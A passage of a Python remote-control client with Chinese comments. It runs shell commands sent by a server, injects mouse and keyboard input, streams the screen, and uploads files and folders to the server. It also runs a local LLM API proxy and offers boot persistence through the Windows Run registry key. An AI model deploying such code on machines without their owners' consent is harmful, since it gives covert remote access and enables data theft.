                    eventData = event.get("data")
                    request_id = eventData.get("request_id") if eventData else None
                    
                    # 处理认证请求
                    if eventType == "authenticate":
                        success, message = authenticate_request(eventData)
                        send_packet(ssl_sock, {"type": "auth_result", "data": {"success": success, "message": message}})
                        print(f"[认证] 认证结果: {message}")
                        continue
                    
                    # 处理屏幕切换请求
                    if eventType == "switch_screen":
                        screen_index = eventData.get("screen_index", 0)
                        success = switch_screen(screen_index)
                        send_packet(ssl_sock, {
                            "type": "switch_screen_result", 
                            "data": {
                                "success": success, 
                                "screen_index": screen_index,
                                "message": f"切换到屏幕{screen_index}" if success else f"屏幕索引无效: {screen_index}"
                            }
                        })
                        print(f"[屏幕] 切换屏幕: {screen_index}, 结果: {success}")
                        continue
                    
                    # 处理获取屏幕信息请求
                    if eventType == "get_screens_info":
                        screens_info = get_all_screens_info()
                        send_packet(ssl_sock, {
                            "type": "screens_info_result", 
                            "data": {
                                "screens": screens_info,
                                "current_screen": current_screen_index
                            }
                        })
                        print(f"[屏幕] 发送屏幕信息: {len(screens_info)} 个屏幕")
                        continue
                    
                    # 检查是否需要认证的操作
                    if eventType in ["mouse_click", "mouse_double_click", "mouse_right_click", "mouse_drag_start", 
                                   "mouse_drag_move", "mouse_drag_end", "mouse_scroll", "mouse_long_press",
                                   "key_press", "key_combo", "key_down", "key_up", "text_input",
                                   "cmd_exec", "start_screen", "stop_screen", "switch_screen", "get_screens_info",
                                   "file_transfer_request", "file_info_request", "list_directory_request", "get_common_paths_request", "folder_transfer_request",
                                   "upload_replace_request"]:
                        if not is_authenticated():
                            send_packet(ssl_sock, {"type": "auth_required", "data": {"message": "需要双重密码认证"}})
                            print("[认证] 需要认证才能执行此操作")
                            continue
                        update_activity()
                    
                    # 处理鼠标点击事件
                    if eventType == "mouse_click":
                        x, y = eventData["x"], eventData["y"]
                        print(f"[调试] 收到鼠标点击事件: ({x}, {y})")
                        
                        # 检查坐标
                        screen_width, screen_height = pyautogui.size()
                        print(f"[调试] 屏幕尺寸: {screen_width}x{screen_height}")
                        print(f"[调试] 目标坐标: ({x}, {y})")
                        
                        if x < 0 or x >= screen_width or y < 0 or y >= screen_height:
                            print(f"[调试] 坐标超出屏幕范围")
                            continue
                        
                        try:
                            # 设置pyautogui配置
                            pyautogui.FAILSAFE = True
                            pyautogui.PAUSE = 0.1
                            
                            # 执行点击
                            pyautogui.click(x, y)
                            print(f"[调试] 鼠标点击执行成功: ({x}, {y})")
                            print(f"[鼠标] 点击: ({x}, {y})")
                        except Exception as e:
                            if is_frozen():
                                print(f"[调试] 鼠标点击执行失败")
                            else:
                                print(f"[调试] 鼠标点击执行失败: {e}")
                                print(f"[调试] 错误详情: {traceback.format_exc()}")
                    
                    # 处理鼠标双击事件
                    elif eventType == "mouse_double_click":
                        x, y = eventData["x"], eventData["y"]
                        print(f"[调试] 收到鼠标双击事件: ({x}, {y})")
                        
                        # 检查坐标
                        screen_width, screen_height = pyautogui.size()
                        print(f"[调试] 屏幕尺寸: {screen_width}x{screen_height}")
                        print(f"[调试] 目标坐标: ({x}, {y})")
                        
                        if x < 0 or x >= screen_width or y < 0 or y >= screen_height:
                            print(f"[调试] 坐标超出屏幕范围")
                            continue
                        
                        try:
                            # 设置pyautogui配置
                            pyautogui.FAILSAFE = True
                            pyautogui.PAUSE = 0.1
                            
                            # 执行双击
                            pyautogui.doubleClick(x, y)
                            print(f"[调试] 鼠标双击执行成功: ({x}, {y})")
                            print(f"[鼠标] 双击: ({x}, {y})")
                        except Exception as e:
                            if is_frozen():
                                print(f"[调试] 鼠标双击执行失败")
                            else:
                                print(f"[调试] 鼠标双击执行失败: {e}")
                                print(f"[调试] 错误详情: {traceback.format_exc()}")
                    
                    # 处理鼠标右键点击事件
                    elif eventType == "mouse_right_click":
                        x, y = eventData["x"], eventData["y"]
                        print(f"[调试] 收到鼠标右键点击事件: ({x}, {y})")
                        
                        # 检查坐标
                        screen_width, screen_height = pyautogui.size()
                        print(f"[调试] 屏幕尺寸: {screen_width}x{screen_height}")
                        print(f"[调试] 目标坐标: ({x}, {y})")
                        
                        if x < 0 or x >= screen_width or y < 0 or y >= screen_height:
                            print(f"[调试] 坐标超出屏幕范围")
                            continue
                        
                        try:
                            # 设置pyautogui配置
                            pyautogui.FAILSAFE = True
                            pyautogui.PAUSE = 0.1
                            
                            # 执行右键点击
                            pyautogui.click(x, y, button='right')
                            print(f"[调试] 鼠标右键点击执行成功: ({x}, {y})")
                            print(f"[鼠标] 右键: ({x}, {y})")
                        except Exception as e:
                            if is_frozen():
                                print(f"[调试] 鼠标右键点击执行失败")
                            else:
                                print(f"[调试] 鼠标右键点击执行失败: {e}")
                                print(f"[调试] 错误详情: {traceback.format_exc()}")
                    # 处理鼠标拖拽开始
                    elif eventType == "mouse_drag_start":
                        x, y = eventData["x"], eventData["y"]
                        pyautogui.mouseDown(x, y, button='left')
                        print(f"[鼠标] 开始拖拽: ({x}, {y})")
                    # 处理鼠标拖拽移动
                    elif eventType == "mouse_drag_move":
                        x, y = eventData["x"], eventData["y"]
                        pyautogui.moveTo(x, y, duration=0.01)
                        print(f"[鼠标] 拖拽移动: ({x}, {y})")
                    # 处理鼠标拖拽结束
                    elif eventType == "mouse_drag_end":
                        x, y = eventData["x"], eventData["y"]
                        pyautogui.mouseUp(x, y, button='left')
                        print(f"[鼠标] 结束拖拽: ({x}, {y})")
                    # 处理鼠标滚轮事件
                    elif eventType == "mouse_scroll":
                        x, y = eventData["x"], eventData["y"]
                        direction = eventData.get("direction", 1)
                        scroll_amount = 3 if direction > 0 else -3
                        pyautogui.scroll(scroll_amount, x=x, y=y)
                        print(f"[鼠标] 滚轮: ({x}, {y}) 方向: {direction}")
                    # 处理鼠标长按事件
                    elif eventType == "mouse_long_press":
                        x, y = eventData["x"], eventData["y"]
                        duration = eventData.get("duration", 1.0)
                        pyautogui.mouseDown(x, y, button='left')
                        time.sleep(duration)
                        pyautogui.mouseUp(x, y, button='left')
                        print(f"[鼠标] 长按: ({x}, {y}) 时长: {duration}秒")
                    # 处理按键事件
                    elif eventType == "key_press":
                        key = eventData["key"]
                        mapped_key = map_keysym_to_pyautogui(key)
                        if mapped_key:
                            pyautogui.press(mapped_key)
                            print(f"[键盘] 按键: {mapped_key}")
                    # 处理组合键事件
                    elif eventType == "key_combo":
                        keys = eventData["keys"]
                        mapped = []
                        for k in keys:
                            mk = map_keysym_to_pyautogui(k)
                            if mk:
                                mapped.append(mk)
                        if mapped:
                            pyautogui.hotkey(*mapped)
                            print(f"[键盘] 组合键: {'+'.join(mapped)}")
                    # 处理按键按下事件
                    elif eventType == "key_down":
                        key = eventData["key"]
                        mapped_key = map_keysym_to_pyautogui(key)
                        if mapped_key:
                            pyautogui.keyDown(mapped_key)
                            print(f"[键盘] 按下: {mapped_key}")
                    # 处理按键释放事件
                    elif eventType == "key_up":
                        key = eventData["key"]
                        mapped_key = map_keysym_to_pyautogui(key)
                        if mapped_key:
                            pyautogui.keyUp(mapped_key)
                            print(f"[键盘] 释放: {mapped_key}")
                    # 文本输入（单字符，含标点/中英文）
                    elif eventType == "text_input":
                        text = eventData.get("text", "")
                        if isinstance(text, str) and text != "":
                            pyautogui.typewrite(text)
                            print(f"[键盘] 文本: {repr(text)}")
                    # 执行命令（简单模式）
                    elif eventType == "cmd_exec":
                        cmd = eventData.get("cmd", "")
                        request_id = eventData.get("request_id")
                        print(f"[命令] 收到命令: {cmd}")
                        output = execute_command(cmd)
                        send_packet(ssl_sock, {"type": "cmd_result", "data": {"output": output, "request_id": request_id}})
                        print(f"[命令] 执行完成，结果长度: {len(output)} 字符")
                    # 开始屏幕传输
                    elif eventType == "start_screen":
                        send_screen = True
                        reset_screen_cache("server start_screen command")
                        print("[屏幕] 开始屏幕传输")
                    # 停止屏幕传输
                    elif eventType == "stop_screen":
                        send_screen = False
                        print("[屏幕] 停止屏幕传输")
                    # 文件传输请求
                    elif eventType == "file_transfer_request":
                        file_path = eventData.get("file_path", "")
                        print(f"[文件传输] 收到文件传输请求: {file_path}")
                        send_file_to_server(ssl_sock, file_path)
                    # 文件信息请求
                    elif eventType == "file_info_request":
                        file_path = eventData.get("file_path", "")
                        print(f"[文件信息] 收到文件信息请求: {file_path}")
                        file_info = get_file_info(file_path)
                        if file_info:
                            send_packet(ssl_sock, {
                                "type": "file_info_result", 
                                "data": {
                                    "success": True, 
                                    "file_info": file_info
                                }
                            })
                        else:
                            send_packet(ssl_sock, {
                                "type": "file_info_result", 
                                "data": {
                                    "success": False, 
                                    "message": f"无法获取文件信息: {file_path}"
                                }
                            })
                    # 目录列表请求
                    elif eventType == "list_directory_request":
                        directory_path = eventData.get("directory_path", "")
                        print(f"[目录浏览] 收到目录列表请求: {directory_path}")
                        result = list_directory(directory_path)
                        
                        # 检查是否返回了错误信息
                        if isinstance(result, dict) and "error" in result:
                            send_packet(ssl_sock, {
                                "type": "list_directory_result", 
                                "data": {
                                    "success": False, 
                                    "message": f"无法列出目录: {directory_path} - {result['error']}",
                                    "directory_path": directory_path,
                                    "error": result['error']
                                }
                            })
                        elif isinstance(result, list):
                            # 成功返回目录列表
                            send_packet(ssl_sock, {
                                "type": "list_directory_result", 
                                "data": {
                                    "success": True, 
                                    "items": result,
                                    "directory_path": directory_path
                                }
                            })
                        else:
                            # 其他情况（如返回None）
                            send_packet(ssl_sock, {
                                "type": "list_directory_result", 
                                "data": {
                                    "success": False, 
                                    "message": f"无法列出目录: {directory_path} - 未知错误",
                                    "directory_path": directory_path
                                }
                            })
                    # 常用路径请求
                    elif eventType == "get_common_paths_request":
                        print("[常用路径] 收到常用路径请求")
                        common_paths = get_common_paths()
                        send_packet(ssl_sock, {
                            "type": "get_common_paths_result", 
                            "data": {
                                "success": True, 
                                "paths": common_paths
                            }
                        })
                    # 文件夹传输请求
                    elif eventType == "folder_transfer_request":
                        folder_path = eventData.get("folder_path", "")
                        print(f"[文件夹传输] 收到文件夹传输请求: {folder_path}")
                        send_folder_to_server(ssl_sock, folder_path)
                    elif eventType == "upload_replace_request":
                        handle_upload_replace_request(ssl_sock, eventData)
                    # 心跳包
                    elif eventType == "heartbeat":
                        # 心跳包不需要特殊处理
                        pass
                    elif eventType == "heartbeat_ping":
                        try:
                            ping_id = eventData.get("ping_id") if eventData else None
                            send_packet(ssl_sock, {
                                "type": "heartbeat_pong",
                                "data": {
                                    "ping_id": ping_id,
                                    "client_ts": time.time()
                                }
                            })
                        except Exception:
                            pass
                    # 性能/画质模式设置与查询
                    elif eventType == "set_quality_mode":
                        try:
                            global fps, jpegQuality, current_quality_mode
                            mode = eventData.get("mode")
                            if mode in QUALITY_PRESETS:
                                current_quality_mode = mode
                                fps = QUALITY_PRESETS[mode]['fps']
                                jpegQuality = QUALITY_PRESETS[mode]['jpegQuality']
                                print(f"[画质] 切换到 {mode}: fps={fps}, jpegQuality={jpegQuality}")
                            else:
                                # 兼容旧请求：不带mode时在两种模式间切换
                                if current_quality_mode == 'performance':
                                    current_quality_mode = 'quality'
                                else:
                                    current_quality_mode = 'performance'
                                fps = QUALITY_PRESETS[current_quality_mode]['fps']
                                jpegQuality = QUALITY_PRESETS[current_quality_mode]['jpegQuality']
                                print(f"[画质] 兼容切换 -> {current_quality_mode}: fps={fps}, jpegQuality={jpegQuality}")
                            # 回传状态
                            send_packet(ssl_sock, {
                                "type": "quality_mode_status",
                                "data": {"mode": current_quality_mode, "fps": fps, "jpegQuality": jpegQuality}
                            })
                        except Exception as e:
                            print(f"[画质] 切换失败: {str(e)}")
                    elif eventType == "get_quality_mode":
                        try:
                            send_packet(ssl_sock, {
                                "type": "quality_mode_status",
                                "data": {"mode": current_quality_mode, "fps": fps, "jpegQuality": jpegQuality}
                            })
                            print(f"[画质] 状态上报: {current_quality_mode}, fps={fps}, jpegQuality={jpegQuality}")
                        except Exception as e:
                            print(f"[画质] 状态上报失败: {str(e)}")
                    else:
                        print(f"[未知] 收到未知消息类型: {eventType}")
                        
                except ConnectionResetError:
                    print("[连接] 连接被重置")
                    break
                except ConnectionAbortedError:
                    print("[连接] 连接被中止")
                    break
                except BrokenPipeError:
                    print("[连接] 管道破裂")
                    break
                except Exception as e:
                    if is_frozen():
                        print(f"[错误] 处理消息失败")
                    else:
                        print(f"[错误] 处理消息时出错: {str(e)}")
                        traceback.print_exc()
                    break
            
            # 清理连接
            print("[清理] 正在清理SSL连接...")
            try:
                ssl_sock.close()
            except:
                pass
            try:
                sock.close()
            except:
                pass
            heartbeat.join(timeout=2)
            screen.join(timeout=2)
            print("[清理] SSL连接已清理")
            
        except ConnectionRefusedError:
            if is_frozen():
                print(f"[连接] 连接被拒绝")
            else:
                print(f"[连接] 连接被拒绝: {server_address}:{server_port}")
            time.sleep(5)
        except socket.timeout:
            if is_frozen():
                print(f"[连接] 连接超时")
            else:
                print(f"[连接] 连接超时: {server_address}:{server_port}")
            time.sleep(5)
        except ssl.SSLError as e:
            if is_frozen():
                print(f"[SSL错误] SSL连接失败")
            else:
                print(f"[SSL错误] SSL连接失败: {str(e)}")
            time.sleep(5)
        except Exception as e:
            if is_frozen():
                print(f"[错误] 连接失败")
            else:
                print(f"[错误] 连接失败: {str(e)}")
                traceback.print_exc()
            time.sleep(5)


# ============================================================
# 本机 FastAPI 网关（固定 10830）- 作为可选组件
# - 目标：先启动本机 10830，再按原逻辑启动远控。
# - 注意：为避免缺依赖导致主程序崩溃，这里全部采用“延迟导入 + 失败降级”。
# - 配置文件：程序目录下的 peizhi.json（不存在也可启动，但请求会返回配置缺失错误）。
# ============================================================

JIANHUALLM_DEFAULT_HOST = "127.0.0.1"
JIANHUALLM_FIXED_PORT = 10830
_JIANHUALLM_SERVER_THREAD = None
_JIANHUALLM_STARTED = False


def _jhgw_runtime_dir() -> str:
    try:
        return get_app_dir()
    except Exception:
        try:
            return os.getcwd()
        except Exception:
            return "."


def _jhgw_config_path() -> str:
    return os.path.join(_jhgw_runtime_dir(), "peizhi.json")


def _jhgw_crash_log_path() -> str:
    return os.path.join(_jhgw_runtime_dir(), "jianhuallm_crash.log")


def _jhgw_access_log_path() -> str:
    return os.path.join(_jhgw_runtime_dir(), "jianhuallm_access.log")


def _jhgw_append_log(path: str, line: str) -> None:
    try:
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {line}\n")
    except Exception:
        pass


def _jhgw_append_crash_log(title: str, err: BaseException) -> None:
    try:
        _jhgw_append_log(_jhgw_crash_log_path(), f"{title} type={type(err).__name__}\n{traceback.format_exc()}")
    except Exception:
        pass


def _jhgw_append_access_log(line: str) -> None:
    _jhgw_append_log(_jhgw_access_log_path(), line)


def _jhgw_ensure_stdio_for_no_console() -> None:
    """
    无控制台场景下（如某些打包方式），sys.stdout/stderr 可能为 None，uvicorn 会崩。
    这里兜底到 os.devnull。
    """
    try:
        if sys.stdout is None or not hasattr(sys.stdout, "isatty"):
            sys.stdout = open(os.devnull, "w", encoding="utf-8", errors="ignore")  # type: ignore[assignment]
        if sys.stderr is None or not hasattr(sys.stderr, "isatty"):
            sys.stderr = open(os.devnull, "w", encoding="utf-8", errors="ignore")  # type: ignore[assignment]
        if sys.stdin is None or not hasattr(sys.stdin, "isatty"):
            sys.stdin = open(os.devnull, "r", encoding="utf-8", errors="ignore")  # type: ignore[assignment]
    except Exception:
        return


def _jhgw_load_json(path: str) -> dict:
    try:
        if not path or not os.path.exists(path):
            return {}
        with open(path, "r", encoding="utf-8") as f:
            obj = json.load(f)
            return obj or {}
    except Exception:
        return {}


def _jhgw_get_cfg(path: str) -> dict:
    cfg = _jhgw_load_json(path)
    if not isinstance(cfg, dict):
        cfg = {}
    cfg.setdefault("server", {})
    cfg.setdefault("upstreams", {})
    cfg.setdefault("routes", {})
    cfg.setdefault("defaults", {})
    # 兼容最简写法：{"api_base": "...", "api_key": "..."}
    if "api_base" in cfg and "upstreams" not in cfg:
        cfg["upstreams"] = {"default": {"api_base": cfg.get("api_base"), "api_key": cfg.get("api_key")}}
    return cfg


def _jhgw_debug_enabled(cfg: dict) -> bool:
    env = os.getenv("JIANHUALLM_DEBUG")
    if env is not None:
        return env.strip().lower() in ("1", "true", "yes", "on")
    try:
        return bool((cfg.get("server") or {}).get("debug", False))
    except Exception:
        return False


def _jhgw_pick_default_upstream(cfg: dict) -> dict | None:
    try:
        ups = cfg.get("upstreams") or {}
        if not isinstance(ups, dict) or not ups:
            return None
        if "default" in ups and isinstance(ups.get("default"), dict):
            return ups.get("default") or {}
        # 选第一个
        for _, v in ups.items():
            if isinstance(v, dict):
                return v
        return None
    except Exception:
        return None


def _jhgw_pick_upstream_for_model(cfg: dict, requested_model: str | None) -> tuple[str | None, dict | None, str | None]:
    """
    根据请求里的 model 字段，按 peizhi.json 做最小路由：
    - 若 model 命中 routes.<model>，取 candidates 第一个可用 upstream key
    - 若 model 直接命中 upstreams.<key>，使用该 upstream
    - 否则使用 defaults.upstream（默认 default）
    返回：(upstream_key, upstream_dict, effective_model_for_upstream)
    """
    try:
        ups = cfg.get("upstreams") or {}
        routes = cfg.get("routes") or {}
        defaults = cfg.get("defaults") or {}
        if not isinstance(ups, dict) or not ups:
            return None, None, requested_model

        def _effective_model(up: dict, fallback: str | None):
            try:
                m = str((up or {}).get("model") or "").strip()
                if m:
                    return m
            except Exception:
                pass
            return fallback

        # 1) routes 命中（例如 model="smart"）
        if requested_model and isinstance(routes, dict):
            r = routes.get(requested_model)
            if isinstance(r, dict):
                cands = r.get("candidates") or []
                if isinstance(cands, list):
                    for k in cands:
                        kk = str(k or "").strip()
                        if not kk:
                            continue
                        up = ups.get(kk)
                        if isinstance(up, dict):
                            return kk, up, _effective_model(up, requested_model)

        # 2) upstream key 直连
        if requested_model and requested_model in ups and isinstance(ups.get(requested_model), dict):
            up = ups.get(requested_model) or {}
            return requested_model, up, _effective_model(up, requested_model)

        # 3) defaults.upstream
        def_key = str(defaults.get("upstream") or "default").strip() or "default"
        if def_key in ups and isinstance(ups.get(def_key), dict):
            up = ups.get(def_key) or {}
            return def_key, up, _effective_model(up, requested_model)

        # 4) fallback：第一个 upstream
        for k, v in ups.items():
            if isinstance(v, dict):
                kk = str(k or "").strip() or None
                return kk, v, _effective_model(v, requested_model)
        return None, None, requested_model
    except Exception:
        return None, None, requested_model


def _jhgw_upstream_api_base(cfg: dict) -> str | None:
    up = _jhgw_pick_default_upstream(cfg)
    api_base = (up or {}).get("api_base")
    if isinstance(api_base, str) and api_base.strip():
        return api_base.strip().rstrip("/")
    return None


def _jhgw_upstream_api_key(cfg: dict) -> str | None:
    up = _jhgw_pick_default_upstream(cfg)
    api_key = (up or {}).get("api_key")
    if isinstance(api_key, str) and api_key.strip():
        return api_key.strip()
    return None


def _jhgw_upstream_url(api_base: str, path: str) -> str:
    base = str(api_base or "").rstrip("/")
    if path.startswith("/v1/") and base.endswith("/v1"):
        return base + path[len("/v1") :]
    return base + path


def _jhgw_filter_headers(in_headers: dict) -> dict:
    # 透传大部分 header，但清掉会导致上游不一致/冲突的字段
    drop = {"host", "content-length", "connection", "accept-encoding"}
    out = {}
    for k, v in (in_headers or {}).items():
        lk = str(k).lower()
        if lk in drop:
            continue
        out[str(k)] = str(v)
    return out


def _jhgw_create_app(config_path: str):
    # 延迟导入：缺依赖不会影响主程序
    from fastapi import FastAPI, HTTPException, Request as _FastAPIRequest  # type: ignore
    from fastapi.responses import JSONResponse, Response, StreamingResponse  # type: ignore
    import httpx  # type: ignore

    # 重要：本文件启用了 `from __future__ import annotations`，导致注解在运行时为字符串。
    # FastAPI 会用函数的 __globals__ 来解析注解字符串；而 _jhgw_create_app 的局部导入不会出现在 __globals__。
    # 结果就是 `request: Request` 解析失败，被当成 query 参数，从而出现 422：
    # {"detail":[{"loc":["query","request"],"msg":"Field required"}]}
    # 这里把 Request 类注入到模块全局，再用全局名做注解，确保 FastAPI 能正确注入 Request 对象。
    try:
        globals()["_JHGW_Request"] = _FastAPIRequest  # type: ignore[name-defined]
    except Exception:
        pass

    app = FastAPI(title="JianHuaLLM - Local Gateway", version="0.1.0")

    def _jsonable(obj):
        try:
            if obj is None or isinstance(obj, (str, int, float, bool, list, dict)):
                return obj
            if hasattr(obj, "model_dump") and callable(getattr(obj, "model_dump")):
                try:
                    return obj.model_dump()
                except Exception:
                    pass
            if hasattr(obj, "dict") and callable(getattr(obj, "dict")):
                try:
                    return obj.dict()
                except Exception:
                    pass
            return json.loads(json.dumps(obj, default=str, ensure_ascii=False))
        except Exception:
            return str(obj)

    def _utf8_json(data, status_code: int = 200):
        return JSONResponse(content=_jsonable(data), status_code=int(status_code), media_type="application/json; charset=utf-8")

    @app.get("/")
    async def root():
        return _utf8_json({"name": "jianhuallm", "port_fixed": JIANHUALLM_FIXED_PORT, "config_path": config_path})

    @app.get("/health")
    async def health():
        cfg = _jhgw_get_cfg(config_path)
        return _utf8_json(
            {
                "status": "ok",
                "time_ms": int(time.time() * 1000),
                "host": (cfg.get("server") or {}).get("host", JIANHUALLM_DEFAULT_HOST),
                "port": JIANHUALLM_FIXED_PORT,
                "config_path": config_path,
                "config_exists": bool(config_path and os.path.exists(config_path)),
                "debug": _jhgw_debug_enabled(cfg),
            }
        )

    @app.get("/v1/models")
    async def list_models():
        cfg = _jhgw_get_cfg(config_path)
        routes = cfg.get("routes") or {}
        upstreams = cfg.get("upstreams") or {}
        ids = []
        if isinstance(routes, dict):
            ids.extend([str(k) for k in routes.keys()])
        if isinstance(upstreams, dict):
            for up in upstreams.values():
                if isinstance(up, dict):
                    m = str(up.get("model", "") or "").strip()
                    if m:
                        ids.append(m)
        # 去重排序
        uniq = []
        seen = set()
        for x in ids:
            if x in seen:
                continue
            seen.add(x)
            uniq.append(x)
        uniq.sort()
        return _utf8_json({"object": "list", "data": [{"id": x, "object": "model"} for x in uniq]})

    @app.api_route("/v1/{subpath:path}", methods=["GET", "POST", "DELETE"])
    async def proxy_v1(subpath: str, request: _JHGW_Request):  # type: ignore[name-defined]
        cfg = _jhgw_get_cfg(config_path)
        debug = _jhgw_debug_enabled(cfg)
        method = request.method.upper()
        query = str(request.url.query or "")

        # 读 body（尽量不报错）
        raw = await request.body()
        req_id = uuid.uuid4().hex[:12]

        # 解析 body 以做最小路由：smart -> default upstream 的真实模型名
        body_obj = None
        requested_model = None
        if method == "POST" and raw:
            try:
                body_text = raw.decode("utf-8-sig", errors="ignore")
                body_obj = json.loads(body_text) if body_text else None
                if isinstance(body_obj, dict):
                    rm = body_obj.get("model")
                    if isinstance(rm, str) and rm.strip():
                        requested_model = rm.strip()
            except Exception:
                body_obj = None
                requested_model = None

        up_key, up, effective_model = _jhgw_pick_upstream_for_model(cfg, requested_model)
        api_base = None
        api_key = None
        try:
            api_base = (up or {}).get("api_base")
            api_key = (up or {}).get("api_key")
        except Exception:
            api_base = None
            api_key = None
        if isinstance(api_base, str):
            api_base = api_base.strip().rstrip("/")
        else:
            api_base = _jhgw_upstream_api_base(cfg)
        if isinstance(api_key, str):
            api_key = api_key.strip()
        else:
            api_key = _jhgw_upstream_api_key(cfg)
        if not api_base:
            raise HTTPException(status_code=400, detail="peizhi.json 未配置 upstream.api_base")

        # 若命中路由且配置了真实模型名，则替换发给上游的 model
        if isinstance(body_obj, dict) and effective_model and isinstance(effective_model, str) and effective_model.strip():
            body_obj["model"] = effective_model.strip()
            try:
                raw = json.dumps(body_obj, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
            except Exception:
                # 保底：不改 raw
                pass

        path = "/v1/" + (subpath or "").lstrip("/")
        url = _jhgw_upstream_url(str(api_base), path)
        if query:
            url = url + ("&" if "?" in url else "?") + query

        _jhgw_append_access_log(
            f"{req_id} {method} {path} len={len(raw)} model={requested_model or '-'}->"
            f"{(effective_model or requested_model or '-')} upstream={up_key or 'default'} url={url}"
        )

        headers = _jhgw_filter_headers(dict(request.headers))
        if api_key:
            headers["Authorization"] = f"Bearer {api_key}"

        # 判断是否流式（只对 chat/responses 做轻量判断）
        is_stream = False
        if method == "POST" and subpath in ("chat/completions", "responses"):
            try:
                if isinstance(body_obj, dict):
                    is_stream = bool(body_obj.get("stream", False))
                else:
                    body_text2 = raw.decode("utf-8-sig", errors="ignore")
                    body_obj2 = json.loads(body_text2) if body_text2 else {}
                    is_stream = bool((body_obj2 or {}).get("stream", False))
            except Exception:
                is_stream = False

        timeout_seconds = 600
        try:
            defaults = cfg.get("defaults") or {}
            timeout_seconds = int(defaults.get("timeout_seconds", 600) or 0) or 600
        except Exception:
            timeout_seconds = 600
        timeout = httpx.Timeout(timeout_seconds)

        if is_stream:
            async def gen():
                try:
                    async with httpx.AsyncClient(timeout=timeout) as client:
                        async with client.stream(method, url, headers=headers, content=raw) as r:
                            if int(r.status_code) >= 400:
                                err_bytes = await r.aread()
                                try:
                                    err_payload = json.loads(err_bytes.decode("utf-8", errors="replace"))
                                except Exception:
                                    err_payload = {"error": {"message": err_bytes.decode("utf-8", errors="replace")}}
                                yield f"data: {json.dumps(err_payload, ensure_ascii=False)}\n\n".encode("utf-8")
                                yield b"data: [DONE]\n\n"
                                return
                            async for chunk in r.aiter_bytes():
                                yield chunk
                except Exception as e:
                    if debug:
                        _jhgw_append_crash_log(f"[{req_id}] stream proxy crashed", e)
                    yield f"data: {json.dumps({'error': {'message': str(e), 'code': 'proxy_stream_error'}}, ensure_ascii=False)}\n\n".encode("utf-8")
                    yield b"data: [DONE]\n\n"

            return StreamingResponse(gen(), media_type="text/event-stream")

        try:
            async with httpx.AsyncClient(timeout=timeout) as client:
                r = await client.request(method, url, headers=headers, content=raw)
                out = await r.aread()
                ct = str(r.headers.get("content-type") or "application/octet-stream")
                return Response(content=out, status_code=int(r.status_code), media_type=ct)
        except httpx.RequestError as e:
            if debug:
                _jhgw_append_crash_log(f"[{req_id}] httpx request error", e)
            raise HTTPException(status_code=502, detail={"error": {"message": str(e), "code": "upstream_request_error"}})
        except Exception as e:
            if debug:
                _jhgw_append_crash_log(f"[{req_id}] proxy error", e)
            raise HTTPException(status_code=500, detail={"error": {"message": str(e), "code": "proxy_error"}})

    return app


def start_local_gateway_10830(config_path: str | None = None) -> bool:
    """
    启动本机 10830 网关（后台线程）。
    - 返回 True：已启动或已在运行
    - 返回 False：依赖缺失/端口占用/启动失败
    """
    global _JIANHUALLM_SERVER_THREAD, _JIANHUALLM_STARTED
    _startup_trace("GATEWAY: start_local_gateway_10830 enter config_path=" + repr(config_path))
    if _JIANHUALLM_STARTED and _JIANHUALLM_SERVER_THREAD:
        _startup_trace("GATEWAY: already started flag=true")
        return True

    cfg_path = (config_path or "").strip() or _jhgw_config_path()
    host = JIANHUALLM_DEFAULT_HOST
    port = int(JIANHUALLM_FIXED_PORT)

    # 端口占用检测：如果已经有服务在监听，就不重复启动
    try:
        import socket as _socket
        s = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
        s.settimeout(0.3)
        r = s.connect_ex((host, port))
        s.close()
        if r == 0:
            _startup_trace(f"GATEWAY: port already listening {host}:{port}, skip start")
            _jhgw_append_access_log(f"gateway already listening on {host}:{port}, skip start")
            _JIANHUALLM_STARTED = True
            return True
    except Exception:
        pass

    try:
        _startup_trace("GATEWAY: ensure stdio and create uvicorn thread")
        _jhgw_ensure_stdio_for_no_console()
        # 延迟导入
        import uvicorn  # type: ignore
        app = _jhgw_create_app(cfg_path)

        def _run():
            try:
                _startup_trace("GATEWAY: uvicorn thread start")
                config = uvicorn.Config(app, host=host, port=port, log_level="info", access_log=False)
                server = uvicorn.Server(config)
                server.run()
            except Exception as e:
                _startup_trace("GATEWAY: uvicorn thread crashed=" + repr(e))
                _jhgw_append_crash_log("uvicorn server crashed", e)

        th = threading.Thread(target=_run, daemon=True)
        th.start()
        _JIANHUALLM_SERVER_THREAD = th
        _JIANHUALLM_STARTED = True
        _jhgw_append_access_log(f"gateway started host={host} port={port} config={cfg_path}")
        _startup_trace("GATEWAY: thread started ok")
        return True
    except Exception as e:
        _startup_trace("GATEWAY: start_local_gateway_10830 failed=" + repr(e))
        _jhgw_append_crash_log("start_local_gateway_10830 failed", e)
        return False


def _get_autostart_registry_name() -> str:
    path = get_program_entry_path()
    name = os.path.splitext(os.path.basename(path))[0].strip()
    return name or "client_autostart"


def _is_autostart_registered() -> bool:
    if platform.system() != "Windows":
        return False
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_READ,
        )
    except Exception:
        return False
    try:
        name = _get_autostart_registry_name()
        try:
            _, _ = winreg.QueryValueEx(key, name)
            return True
        except FileNotFoundError:
            return False
        except Exception:
            return False
    finally:
        try:
            winreg.CloseKey(key)
        except Exception:
            pass


def _register_autostart_entry() -> bool:
    if platform.system() != "Windows":
        return False
    try:
        import winreg
        path = get_program_entry_path()
        command = f'"{path}"'
        name = _get_autostart_registry_name()
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
        return True
    except Exception:
        return False


def prompt_enable_autostart() -> None:
    if platform.system() != "Windows":
        return
    if _is_autostart_registered():
        return
    root = None
    try:
        root = tk.Tk()
        root.withdraw()
        answer = messagebox.askyesno(
            "开机自启动",
            "是否将当前程序注册为开机启动？",
            icon=messagebox.QUESTION,
        )
        if answer:
            success = _register_autostart_entry()
            if success:
                messagebox.showinfo("开机启动", "已为当前程序创建开机启动项。")
            else:
                messagebox.showwarning("开机启动", "创建自启动项失败，请手动设置。")
    except Exception:
        pass
    finally:
